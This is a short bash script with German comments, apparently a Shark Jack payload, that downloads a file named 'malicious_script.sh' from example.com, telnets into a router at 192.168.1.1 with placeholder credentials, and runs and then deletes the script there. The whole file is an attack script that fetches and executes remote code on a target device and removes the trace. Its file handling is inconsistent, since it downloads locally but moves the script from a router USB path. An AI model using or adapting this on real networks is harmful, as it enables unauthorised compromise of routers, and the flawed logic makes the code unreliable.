#!/bin/bash

# Verbinde den Shark Jack mit dem Router
/sbin/ifconfig eth0 up
/sbin/dhclient eth0

# Lade das gewünschte Skript herunter
/usr/bin/wget http://example.com/malicious_script.sh

# Führe das Skript auf dem Router aus
/usr/bin/expect <<EOF
spawn telnet 192.168.1.1
expect "login: "
send "username\r"
expect "Password: "
send "password\r"
expect "> "
send "cd /tmp; mv /mnt/usb1/malicious_script.sh .; chmod +x malicious_script.sh; sh malicious_script.sh; rm -f malicious_script.sh\r"
expect "> "
send "exit\r"
EOF
